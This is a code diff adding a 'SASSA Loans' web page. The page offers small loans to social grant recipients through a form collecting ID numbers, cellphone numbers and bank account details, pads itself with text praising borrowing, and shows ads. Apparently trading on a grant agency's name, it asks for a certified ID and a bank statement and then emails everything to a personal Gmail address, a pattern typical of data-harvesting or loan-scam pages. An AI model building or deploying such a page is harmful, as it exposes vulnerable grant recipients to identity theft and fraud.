@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SASSA Loans</title>
+<style>
+  :root {
+    --bg: #000;
+    --text: #fff;
+    --card: #0f0f0f;
+    --accent: #28a745;
+  }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: Inter, system-ui, Arial, Helvetica, sans-serif;
+  }
+
+  header {
+    text-align: center;
+    padding: 20px;
+    font-size: 24px;
+    font-weight: bold;
+  }
+
+  header a {
+    text-decoration: none;
+    color: var(--accent);
+  }
+
+  .container {
+    max-width: 600px;
+    margin: 20px auto;
+    padding: 16px;
+    background: var(--card);
+    border-radius: 10px;
+  }
+
+  label {
+    display: block;
+    margin-top: 12px;
+    margin-bottom: 4px;
+    font-weight: bold;
+  }
+
+  input[type="text"], select, input[type="number"], input[type="range"] {
+    width: 94%;
+    padding: 10px;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
+    margin-bottom: 10px;
+    background: #222;
+    color: #fff;
+  }
+
+  input[type="range"] {
+    cursor: pointer;
+  }
+
+  #loanAmountDisplay {
+    text-align: right;
+    font-weight: bold;
+    margin-bottom: 10px;
+  }
+
+  button {
+    padding: 12px;
+    width: 100%;
+    background: var(--accent);
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    color: #fff;
+    margin-top: 10px;
+  }
+
+  .popup {
+    position: fixed;
+    top: 0; left:0; right:0; bottom:0;
+    background: rgba(0,0,0,0.95);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    flex-direction: column;
+    text-align: center;
+    padding: 20px;
+    display: none;
+    color: #fff;
+  }
+
+  .popup button {
+    margin-top: 20px;
+    padding: 10px 20px;
+    font-size: 16px;
+    font-weight: bold;
+    border: none;
+    border-radius: 8px;
+    background: var(--accent);
+    color: #fff;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+<header style="color: #fff"><a href="index.html" style="color: #fff">SASSA Loans</a></header>
+<div class="container">
+  <label for="loanAmount">Amount to Borrow: <span id="loanAmountDisplay">R100</span></label>
+  <input type="range" id="loanAmount" min="100" max="1200" step="50" value="100">
+
+  <label for="name">Name</label>
+  <input type="text" id="name" placeholder="Enter your name">
+
+  <label for="surname">Surname</label>
+  <input type="text" id="surname" placeholder="Enter your surname">
+
+  <label for="idNumber">ID Number</label>
+  <input type="text" id="idNumber" maxlength="13" placeholder="13-digit ID">
+
+  <label for="cellphone">Cellphone Number</label>
+  <input type="text" id="cellphone" maxlength="10" placeholder="10-digit phone number">
+
+  <label for="grantType">Type of Grant</label>
+  <select id="grantType">
+    <option value="">Select Grant</option>
+    <option>Child Support Grant</option>
+    <option>Old Age Pension</option>
+    <option>Disability Grant</option>
+    <option>Foster Child Grant</option>
+    <option>Care Dependency Grant</option>
+  </select>
+
+  <label for="bankName">Bank Name</label>
+  <select id="bankName">
+    <option value="">Select Bank</option>
+    <option>FNB</option>
+    <option>Standard Bank</option>
+    <option>ABSA</option>
+    <option>Nedbank</option>
+    <option>Capitec</option>
+    <option>Postbank</option>
+  </select>
+
+  <label for="accountType">Account Type</label>
+  <select id="accountType">
+    <option value="">Select Account Type</option>
+    <option>Cheque</option>
+    <option>Savings</option>
+  </select>
+
+  <label for="accountNumber">Bank Account Number</label>
+  <input type="text" id="accountNumber" placeholder="Enter account number">
+
+  <button id="applyBtn">Apply</button>
+</div>
+
+<h1 style="color:#fff; text-align:center; margin-bottom:20px; font-size:28px; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  How Loans Can Be Good and How Paying Them Back Improves Your Credit Score
+</h1>
+
+<p style="color:#fff; font-size:16px; margin-bottom:18px; padding: 10px; line-height:1.6; text-align:justify; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  Many people view loans with fear or negativity, but when used wisely, loans can actually be a powerful financial tool that helps you build a better future. A loan gives you access to funds that you might not have at the moment, allowing you to invest in important things such as education, starting a small business, or managing unexpected expenses. Instead of seeing a loan as a burden, it is better understood as a stepping stone toward achieving long-term goals.
+</p>
+
+<p style="color:#fff; font-size:16px; margin-bottom:18px; padding: 10px; line-height:1.6; text-align:justify; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  For students, NSFAS loans or study loans can open doors to education that would otherwise be unaffordable. Similarly, for social grant recipients, a small short-term loan can help cover emergencies, buy essential items, or invest in income-generating projects. The key lies in borrowing responsibly—taking only what you need and ensuring you can pay it back on time. When you do this, you begin to establish a positive financial record.
+</p>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7523555661265068"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-format="fluid"
+     data-ad-layout-key="-6t+ed+2i-1n-4w"
+     data-ad-client="ca-pub-7523555661265068"
+     data-ad-slot="1338431504"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<p style="color:#fff; font-size:16px; margin-bottom:18px; padding: 10px; line-height:1.6; text-align:justify; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  Every time you borrow money and make repayments on time, you are proving to lenders that you are trustworthy and financially disciplined. This reliability is recorded in your credit profile. The more positive actions you take—such as paying installments early, not missing payments, and keeping your loan balances under control—the stronger your credit score becomes. A good credit score shows banks and lenders that you are low-risk, which can open the door to better opportunities in the future.
+</p>
+
+<p style="color:#fff; font-size:16px; margin-bottom:18px; padding: 10px; line-height:1.6; text-align:justify; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  Having a good credit score can make it easier to qualify for larger loans at lower interest rates. It also helps when you apply for things like car finance, home loans, or even certain jobs that check financial responsibility. When lenders see that you have a history of paying back loans on time, they are more likely to trust you with better offers and favorable repayment terms. This is why borrowing responsibly and repaying consistently is one of the best ways to build long-term financial stability.
+</p>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7523555661265068"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-format="fluid"
+     data-ad-layout-key="-6t+ed+2i-1n-4w"
+     data-ad-client="ca-pub-7523555661265068"
+     data-ad-slot="1338431504"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<p style="color:#fff; font-size:16px; margin-bottom:18px; padding: 10px; line-height:1.6; text-align:justify; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  On the other hand, failing to repay a loan on time can damage your credit score, making it harder and more expensive to borrow in the future. It is always important to plan your budget carefully before taking a loan, ensuring that you have a realistic repayment strategy. Setting reminders, automating payments, and keeping track of your debts can help you stay consistent and avoid penalties.
+</p>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7523555661265068"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-format="fluid"
+     data-ad-layout-key="-6t+ed+2i-1n-4w"
+     data-ad-client="ca-pub-7523555661265068"
+     data-ad-slot="1338431504"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<p style="color:#fff; font-size:16px; margin-bottom:18px; padding: 10px; line-height:1.6; text-align:justify; font-family:Inter,system-ui,Arial,Helvetica,sans-serif;">
+  In conclusion, loans are not inherently bad—they are tools that can help you reach goals faster when managed wisely. Using a loan for productive reasons such as education, investment, or personal growth can improve your life significantly. Most importantly, paying your loan back on time is more than just a financial responsibility—it is a way to build a strong credit score, gain financial freedom, and secure a brighter, more stable future.
+</p>
+
+<div class="popup" id="popup">
+  <p>Please attach the following documents:</p>
+  <ul style="text-align:left;">
+    <li>Certified ID Document</li>
+    <li>Bank Statement showing your SASSA grant</li>
+  </ul>
+  <button id="popupOk">OK</button>
+</div>
+
+<script>
+  const loanAmount = document.getElementById('loanAmount');
+  const loanDisplay = document.getElementById('loanAmountDisplay');
+  loanAmount.addEventListener('input', () => {
+    loanDisplay.textContent = 'R' + loanAmount.value;
+  });
+
+  const applyBtn = document.getElementById('applyBtn');
+  const popup = document.getElementById('popup');
+  const popupOk = document.getElementById('popupOk');
+
+  applyBtn.addEventListener('click', () => {
+    const name = document.getElementById('name').value.trim();
+    const surname = document.getElementById('surname').value.trim();
+    const idNumber = document.getElementById('idNumber').value.trim();
+    const cellphone = document.getElementById('cellphone').value.trim();
+    const grantType = document.getElementById('grantType').value;
+    const bankName = document.getElementById('bankName').value;
+    const accountType = document.getElementById('accountType').value;
+    const accountNumber = document.getElementById('accountNumber').value.trim();
+    const amount = loanAmount.value;
+
+    // Validate fields
+    if(!name || !surname || !idNumber || !cellphone || !grantType || !bankName || !accountType || !accountNumber){
+      alert('Please fill in all fields.');
+      return;
+    }
+
+    if(idNumber.length !== 13 || !/^\d+$/.test(idNumber)){
+      alert('ID Number must be 13 digits.');
+      return;
+    }
+
+    if(cellphone.length !== 10 || !/^\d+$/.test(cellphone)){
+      alert('Cellphone number must be 10 digits.');
+      return;
+    }
+
+    popup.style.display = 'flex';
+  });
+
+  popupOk.addEventListener('click', () => {
+    popup.style.display = 'none';
+
+    const name = document.getElementById('name').value.trim();
+    const surname = document.getElementById('surname').value.trim();
+    const idNumber = document.getElementById('idNumber').value.trim();
+    const cellphone = document.getElementById('cellphone').value.trim();
+    const grantType = document.getElementById('grantType').value;
+    const bankName = document.getElementById('bankName').value;
+    const accountType = document.getElementById('accountType').value;
+    const accountNumber = document.getElementById('accountNumber').value.trim();
+    const amount = loanAmount.value;
+
+    const emailSubject = encodeURIComponent('SASSA Loan Application');
+    const emailBody = encodeURIComponent(`Dear Loan Officer,
+
+I would like to apply for a SASSA loan. Please find my details below:
+
+Name: ${name}
+Surname: ${surname}
+ID Number: ${idNumber}
+Cellphone Number: ${cellphone}
+Type of Grant: ${grantType}
+Bank Name: ${bankName}
+Account Type: ${accountType}
+Bank Account Number: ${accountNumber}
+Loan Amount Requested: R${amount}
+
+Kindly review my application and advise further steps.
+
+Thank you,
+${name} ${surname}`);
+
+    window.location.href = `mailto:abakwandabezitha@gmail.com?subject=${emailSubject}&body=${emailBody}`;
+  });
+</script>
+</body>
+</html>
